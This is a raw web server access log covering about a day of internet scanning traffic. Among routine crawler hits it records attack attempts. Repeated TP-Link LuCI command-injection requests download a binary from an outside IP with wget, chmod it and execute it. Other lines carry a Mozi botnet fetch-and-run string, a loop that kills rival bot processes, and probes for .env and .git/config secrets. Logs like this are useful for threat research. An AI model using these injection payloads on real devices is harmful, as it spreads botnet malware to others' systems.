205.210.31.78 - - [07/Jul/2024:19:30:18 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xE6s>-\xF7y\xFB\x02p\xD8\xA0\xB6k\xF4\x9F,\xC8\xBC\xD2{To\xBE'\xB3\xD5\xAC\x935\x99\xED \x8Eu6)\xE2\xD4\xC5*\xEC\xD3\xA9\x81\x01j~\xF3\xD6\xFAy\xC19C[m\x15\xAB\xDD\xB8\xA3\x84\xDD\x1B\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
141.98.83.197 - - [07/Jul/2024:19:37:51 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.97.136.230 - - [07/Jul/2024:19:45:15 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 154 "-" "-"
141.98.83.197 - - [07/Jul/2024:21:09:21 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:22:31:38 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
4.255.101.254 - - [07/Jul/2024:22:32:15 +0000] "GET /druid/index.html HTTP/1.1" 200 1054 "-" "Mozilla/5.0 zgrab/0.x"
206.168.34.45 - - [07/Jul/2024:22:59:59 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.45 - - [07/Jul/2024:23:00:01 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
206.168.34.45 - - [07/Jul/2024:23:00:01 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
178.87.205.241 - - [07/Jul/2024:23:00:10 +0000] "GET / HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
141.98.83.197 - - [07/Jul/2024:23:00:40 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
194.165.16.10 - - [07/Jul/2024:23:31:47 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
92.249.48.202 - - [07/Jul/2024:23:34:38 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.43 - - [07/Jul/2024:23:34:54 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:23:35:56 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [08/Jul/2024:00:58:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:00:58:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
4.156.21.82 - - [08/Jul/2024:01:18:46 +0000] "GET /druid/index.html HTTP/1.1" 200 1054 "-" "Mozilla/5.0 zgrab/0.x"
64.62.156.19 - - [08/Jul/2024:01:32:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE6\x0F\x92\x81%,\xBD\xD37\x08\x99\x94\x0E\x81\xA7<\x93\x15p\xAF&\x8An\x98\x05\xFD\xC2\xD6\x8E(\xFE\xBA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
20.225.0.9 - - [08/Jul/2024:01:33:45 +0000] "GET /hudson HTTP/1.1" 200 1054 "-" "Mozilla/5.0 zgrab/0.x"
141.98.83.197 - - [08/Jul/2024:01:56:40 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
71.6.232.25 - - [08/Jul/2024:02:02:49 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
83.97.73.245 - - [08/Jul/2024:02:06:30 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.94.61.224 - - [08/Jul/2024:02:24:37 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
167.94.138.43 - - [08/Jul/2024:02:26:47 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
167.94.138.43 - - [08/Jul/2024:02:26:51 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.43 - - [08/Jul/2024:02:26:53 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
167.94.138.43 - - [08/Jul/2024:02:26:53 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
141.98.83.197 - - [08/Jul/2024:02:53:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:02:53:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
83.97.73.245 - - [08/Jul/2024:03:04:20 +0000] "GET /actuator/gateway/routes HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
94.156.68.162 - - [08/Jul/2024:03:22:50 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
94.156.68.162 - - [08/Jul/2024:03:23:11 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.42 Safari/537.36"
192.210.150.32 - - [08/Jul/2024:03:26:33 +0000] "GET /.env HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Linux; Android 9; VKY-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
94.156.66.39 - - [08/Jul/2024:03:27:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 154 "http://103.179.33.152:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.39 - - [08/Jul/2024:03:27:13 +0000] "" 400 0 "-" "-"
192.210.150.32 - - [08/Jul/2024:03:27:19 +0000] "GET /.env HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15"
3.10.207.124 - - [08/Jul/2024:03:46:20 +0000] "\xCFd8\xA5HT\xDD\xBF`\x10\x04\xB0N\x1E\x00\x00\x02\x04\x05\xB4" 400 154 "-" "-"
65.49.1.11 - - [08/Jul/2024:04:00:54 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
65.49.1.13 - - [08/Jul/2024:04:02:43 +0000] "GET /webui/ HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
65.49.1.16 - - [08/Jul/2024:04:03:49 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
65.49.1.16 - - [08/Jul/2024:04:04:24 +0000] "GET /geoserver/web/ HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
92.249.48.202 - - [08/Jul/2024:04:12:15 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.43 - - [08/Jul/2024:04:41:25 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.244.227 - - [08/Jul/2024:04:53:11 +0000] "GET /.env HTTP/1.1" 206 2659 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.92.244.227 - - [08/Jul/2024:04:53:11 +0000] "GET /.env HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64)"
141.98.83.197 - - [08/Jul/2024:05:12:22 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.249.227 - - [08/Jul/2024:05:46:29 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC 2PXH3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
91.92.249.227 - - [08/Jul/2024:05:46:33 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36"
141.98.83.197 - - [08/Jul/2024:06:13:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:06:13:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
185.191.126.213 - - [08/Jul/2024:06:14:55 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
46.174.191.28 - - [08/Jul/2024:07:16:54 +0000] "GET / HTTP/1.0" 200 2659 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
54.210.238.102 - - [08/Jul/2024:07:21:42 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
54.210.238.102 - - [08/Jul/2024:07:21:44 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "http://103.179.33.152/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
179.43.161.135 - - [08/Jul/2024:07:30:02 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
185.191.126.213 - - [08/Jul/2024:08:31:04 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
141.98.83.197 - - [08/Jul/2024:08:48:55 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
147.185.133.167 - - [08/Jul/2024:08:50:33 +0000] "GET / HTTP/1.1" 200 1054 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
31.220.1.83 - - [08/Jul/2024:08:50:37 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
142.93.75.26 - - [08/Jul/2024:08:55:38 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC2 \x12\xB2\x1DGo\x12YkC8)\xCC\xA4\xAEpK\xFB\x7F|\x97\xED\x9Et\x1Eg\x90tD\x00m\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
142.93.75.26 - - [08/Jul/2024:08:55:38 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x039<\xBC.z\xB5\xA9\xBEP\xC6t," 400 154 "-" "-"
142.93.75.26 - - [08/Jul/2024:08:55:38 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:39 +0000] "GET /form.html HTTP/1.1" 200 1054 "-" "curl/8.1.2"
142.93.75.26 - - [08/Jul/2024:08:55:39 +0000] "GET /upl.php HTTP/1.1" 200 1054 "-" "Mozilla/5.0"
142.93.75.26 - - [08/Jul/2024:08:55:40 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9B\xD4\x044\xDE\xD0\xFDh5aav\xDC'\xCD\xC7Q+<\x05\xD6\xB4\xF9\x09\x00\xF0\x92\x5C\x10>\x05\xAA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
142.93.75.26 - - [08/Jul/2024:08:55:40 +0000] "GET /geoip/ HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:41 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:41 +0000] "GET /1.php HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:42 +0000] "GET /bundle.js HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:42 +0000] "GET /files/ HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:43 +0000] "GET /systembc/password.php HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:43 +0000] "GET /password.php HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.75.26 - - [08/Jul/2024:08:55:44 +0000] "GET /info.php HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
3.10.207.124 - - [08/Jul/2024:09:27:18 +0000] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xFA\xA8p)\x00$\x98\xA8\x7F\x09\xEDs@\xDE\x93L\x88\x95\xF3\xA5W\xFE5\xC76\xCEh\x1D\x14,\xEF\x81\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
141.98.83.197 - - [08/Jul/2024:09:42:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:09:42:44 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
205.210.31.105 - - [08/Jul/2024:09:48:54 +0000] "GET / HTTP/1.0" 200 2659 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
35.236.51.112 - - [08/Jul/2024:09:51:52 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03\x1B\x88\x1A\x08\x18 t\xB3I\xB1\xAF-IVte\xC7\x99^J#\xA0\xAD\xEBZ\x9D\xD1\xA4\x86\x0F\xDE\x02 \x7F\x95\xB7\x92\x94q\xD2W\x1E" 400 154 "-" "-"
35.236.51.112 - - [08/Jul/2024:09:51:54 +0000] "OPTIONS / HTTP/1.0" 405 154 "-" "-"
185.224.128.43 - - [08/Jul/2024:10:05:52 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.128.232.174 - - [08/Jul/2024:10:14:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
92.249.48.202 - - [08/Jul/2024:10:35:22 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.128.232.174 - - [08/Jul/2024:11:00:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:12:12:54 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
187.198.23.162 - - [08/Jul/2024:12:26:02 +0000] "GET / HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
131.188.6.171 - - [08/Jul/2024:12:38:24 +0000] "GET / HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
141.98.83.197 - - [08/Jul/2024:12:55:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:12:55:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
185.242.226.10 - - [08/Jul/2024:13:20:43 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
165.154.172.244 - - [08/Jul/2024:13:39:01 +0000] "GET / HTTP/1.1" 200 2659 "-" "curl/7.29.0"
165.154.172.244 - - [08/Jul/2024:13:39:02 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF8\xE7\xFED\xB3=6\xF4n\xB1\xDB\x8Ex\xC2;\xBC\x84\xEF\xD8\x90\x15\x7F<\xCB(\xEE\x8A^\x19XEt \x9A\x15y8\xE8*\xC3\xE9h\x22\xFB\xA4\x17\x15e\xF1\x04\xF30R\xEA\x8E\xFCLjl~\x1B\xEB\x8E0\xF0\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
165.154.172.244 - - [08/Jul/2024:13:39:03 +0000] "t3 12.1.2" 400 154 "-" "-"
194.165.16.73 - - [08/Jul/2024:13:57:49 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
185.224.128.43 - - [08/Jul/2024:14:54:49 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
175.107.39.81 - - [08/Jul/2024:14:56:06 +0000] "POST /HNAP1/ HTTP/1.0" 405 154 "-" "-"
141.98.83.197 - - [08/Jul/2024:15:11:23 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.202 - - [08/Jul/2024:15:26:00 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.161.135 - - [08/Jul/2024:15:55:38 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
141.98.83.197 - - [08/Jul/2024:16:30:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:16:30:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
91.238.181.21 - - [08/Jul/2024:17:18:53 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
172.168.40.186 - - [08/Jul/2024:18:32:42 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 zgrab/0.x"
